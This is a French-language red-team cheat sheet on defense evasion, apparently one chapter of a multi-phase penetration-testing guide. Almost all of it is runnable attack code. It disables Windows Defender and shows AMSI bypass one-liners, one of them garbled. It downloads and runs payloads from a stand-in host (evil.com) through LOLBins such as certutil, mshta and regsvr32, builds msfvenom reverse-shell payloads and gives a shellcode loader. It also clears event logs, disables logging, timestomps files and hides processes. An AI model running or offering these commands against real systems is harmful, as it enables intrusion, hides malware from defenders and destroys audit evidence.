# 🛡️ Phase 6: Évasion des défenses

<!-- language-home-navigation -->
[🏠 Accueil en français](../../README.fr.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](06-Defense-Evasion.tr.md) • [🇬🇷 Ελληνικά](06-Defense-Evasion.el.md)

```
  ██████╗ ███████╗███████╗███████╗███╗   ██╗███████╗███████╗
  ██╔══██╗██╔════╝██╔════╝██╔════╝████╗  ██║██╔════╝██╔════╝
  ██║  ██║█████╗  █████╗  █████╗  ██╔██╗ ██║███████╗█████╗  
  ██║  ██║██╔══╝  ██╔══╝  ██╔══╝  ██║╚██╗██║╚════██║██╔══╝  
  ██████╔╝███████╗██║     ███████╗██║ ╚████║███████║███████╗
  ╚═════╝ ╚══════╝╚═╝     ╚══════╝╚═╝  ╚═══╝╚══════╝╚══════╝
        ███████╗██╗   ██╗ █████╗ ███████╗██╗ ██████╗ ███╗   ██╗
        ██╔════╝██║   ██║██╔══██╗██╔════╝██║██╔═══██╗████╗  ██║
        █████╗  ██║   ██║███████║███████╗██║██║   ██║██╔██╗ ██║
        ██╔══╝  ╚██╗ ██╔╝██╔══██║╚════██║██║██║   ██║██║╚██╗██║
        ███████╗ ╚████╔╝ ██║  ██║███████║██║╚██████╔╝██║ ╚████║
        ╚══════╝  ╚═══╝  ╚═╝  ╚═╝╚══════╝╚═╝ ╚═════╝ ╚═╝  ╚═══╝
```

**Objectif :** Contourner les contrôles de sécurité (AV, EDR, AMSI, pare-feu) pour éviter la détection.

> **Précision :** ces exemples sont historiques et dépendent des versions, droits et protections actives. L’obfuscation ou l’encodage ne garantit pas le contournement d’un antivirus ou d’un EDR. Le bloc « Désactiver le suivi des événements » déclare une fonction `EtwEventWrite` mais ne la modifie pas ; il ne désactive donc pas ETW à lui seul. L’exemple AMSI obfusqué contient une chaîne de format incohérente (`{3}` sans quatrième argument), conservée comme dans l’original. Le chargeur C et le shellcode abrégé sont incomplets.

---

## 🛡️ Évasion de Windows Defender

### Désactiver Windows Defender (droits administrateur requis)
```powershell
# Désactiver la protection en temps réel
Set-MpPreference -DisableRealtimeMonitoring $true

# Désactiver les fonctionnalités Defender indiquées
Set-MpPreference -DisableIOAVProtection $true
Set-MpPreference -DisableBehaviorMonitoring $true
Set-MpPreference -DisableBlockAtFirstSeen $true
Set-MpPreference -DisableScriptScanning $true

# Ajouter des exclusions
Add-MpPreference -ExclusionPath "C:\temp"
Add-MpPreference -ExclusionProcess "powershell.exe"

# Par le Registre
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
```

### Vérifier l’état de Defender
```powershell
Get-MpComputerStatus
Get-MpPreference
```

---

## 🔓 Contournement d’AMSI

### Contournement d’AMSI avec PowerShell
```powershell
# Contournement 1 — amsiInitFailed
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Contournement 2 — commande en une ligne de Matt Graeber
[Runtime.InteropServices.Marshal]::WriteInt32([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiContext',[Reflection.BindingFlags]'NonPublic,Static').GetValue($null),0x41414141)

# Contournement 3 — modification en mémoire
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf=@(0);[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$ptr,1)
```

### Contournement d’AMSI avec obfuscation
```powershell
# Obfuscation de chaînes
$a = 'System.Management.Automation.A';$b = 'ms';$u = 'Utils'
$assembly = [Ref].Assembly.GetType(('{0telekinetic1}{2}i{3}' -f $a,$b,$u))
$field = $assembly.GetField(('a]ot>m]ot>siInitFailed' -replace ']ot>',''),'NonPublic,Static')
$field.SetValue($null,$true)
```

---

## 📦 Obfuscation des charges utiles

### Obfuscation PowerShell
```powershell
# Encodage Base64
$cmd = "IEX(New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($cmd)
$encoded = [Convert]::ToBase64String($bytes)
powershell -enc $encoded

# Concaténation de chaînes
$a = 'Down'; $b = 'loadString'
(New-Object Net.WebClient)."$a$b"('http://evil.com/payload.ps1') | IEX

# Invoke-Obfuscation
Invoke-Obfuscation -ScriptPath payload.ps1 -Command 'TOKEN\ALL\1' -Quiet
```

### Obfuscation de binaires
```bash
# Encodage avec msfvenom
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -e x64/xor_dynamic -i 5 -f exe > payload.exe

# XOR personnalisé
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f raw | python3 xor_encrypt.py > payload.bin

# Shikata_ga_nai
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe > payload.exe
```

### Chargeurs de shellcode
```c
// Chargeur simple de shellcode en C
unsigned char shellcode[] = "\xfc\x48\x83...";

int main() {
    void *exec = VirtualAlloc(0, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(exec, shellcode, sizeof(shellcode));
    ((void(*)())exec)();
    return 0;
}
```

---

## 🎭 Living off the land (LOLBins : utilisation détournée d’outils présents sur le système)

### Télécharger et exécuter
```cmd
# certutil
certutil -urlcache -split -f http://evil.com/payload.exe C:\temp\payload.exe
certutil -decode encoded.txt payload.exe

# bitsadmin
bitsadmin /transfer job /download /priority high http://evil.com/payload.exe C:\temp\payload.exe

# curl (Windows 10+)
curl http://evil.com/payload.exe -o C:\temp\payload.exe

# PowerShell
powershell -c "(New-Object Net.WebClient).DownloadFile('http://evil.com/payload.exe','C:\temp\payload.exe')"
Invoke-WebRequest http://evil.com/payload.exe -OutFile C:\temp\payload.exe
```

### Exécuter les charges utiles
```cmd
# rundll32
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WScript.Shell").Run("powershell -ep bypass -c IEX(payload)")

# mshta
mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""powershell -ep bypass -c IEX(payload)"", 0:close")
mshta http://evil.com/payload.hta

# regsvr32
regsvr32 /s /n /u /i:http://evil.com/file.sct scrobj.dll

# wmic
wmic process call create "powershell -ep bypass -c IEX(payload)"

# msiexec
msiexec /q /i http://evil.com/payload.msi
```

### Contournement d’AppLocker/WDAC
```cmd
# installutil
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U payload.exe

# regasm
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /U payload.dll

# msbuild
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe payload.xml
```

---

## 🔒 Contournement d’ETW et de la journalisation

### Désactiver le suivi des événements
```powershell
# Modifier ETW en mémoire
$patch = @"
using System;
using System.Runtime.InteropServices;
public class Etw {
    [DllImport("ntdll.dll")]
    public static extern int EtwEventWrite(long x, long y, long z, long q);
}
"@
Add-Type $patch
```

### Effacer les journaux d’événements
```powershell
# Effacer les journaux indiqués
wevtutil cl System
wevtutil cl Security
wevtutil cl Application
wevtutil cl "Windows PowerShell"

# PowerShell
Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }

# Ou désactiver la journalisation
auditpol /clear /y
```

### Désactiver la journalisation PowerShell
```powershell
# Désactiver la journalisation des blocs de script
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 0

# Désactiver la journalisation des modules
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging" -Name "EnableModuleLogging" -Value 0
```

---

## 🐧 Évasion sous Linux

### Timestomping (modification des horodatages)
```bash
# Modifier les horodatages des fichiers
touch -r /etc/passwd malicious.sh
touch -d "2020-01-01 12:00:00" malicious.sh
```

### Effacer les journaux
```bash
# Effacer l’historique bash
history -c
cat /dev/null > ~/.bash_history
export HISTSIZE=0
unset HISTFILE

# Effacer les journaux système
cat /dev/null > /var/log/auth.log
cat /dev/null > /var/log/syslog
echo > /var/log/messages
```

### Dissimulation de processus
```bash
# Masquer le nom du processus
exec -a "[kworker/0:0]" ./malicious

# Dissimulation avec LD_PRELOAD
# Compiler une bibliothèque qui intercepte readdir() pour masquer les processus
```

---

## 🛠️ Outils

| Outil | Objectif |
|------|---------|
| **Invoke-Obfuscation** | Obfuscation PowerShell |
| **Veil** | Génération de charges utiles |
| **ScareCrow** | Générateur de charges utiles visant à contourner les EDR |
| **Donut** | Générateur de shellcode |
| **Nimcrypt2** | Empaqueteur de fichiers PE |
| **PEzor** | Chargeur de shellcode PE |

---

## 📊 Aide-mémoire

### Méthodes de détection et contournements

| Détection | Technique de contournement |
|-----------|------------------|
| Fondée sur les signatures | Obfuscation, encodage |
| AMSI | Modification en mémoire, scripts de contournement |
| ETW | Modification d’ETW en mémoire |
| Journalisation | Désactivation de la journalisation, effacement des journaux |
| AppLocker | LOLBins, chemins de contournement |
| Comportement | Utilisation détournée d’outils présents sur le système |

### Liste rapide de LOLBins

| Binaire | Utilisation |
|--------|-----|
| certutil | Télécharger des fichiers |
| bitsadmin | Télécharger des fichiers |
| mshta | Exécuter du HTA |
| rundll32 | Exécuter une DLL ou du JavaScript |
| regsvr32 | Exécuter du SCT |
| msbuild | Exécuter du XML |
| installutil | Exécuter un EXE |

---

## 🔗 Fiches associées

- [PowerShell](../../PowerShell/README.md)
- [Mimikatz](../../Mimikatz/README.md)

---

**Phase précédente :** [← 05 - Persistance](./05-Persistence.fr.md)

**Phase suivante :** [07 - Actions sur les objectifs →](./07-Actions-Objectives.fr.md)
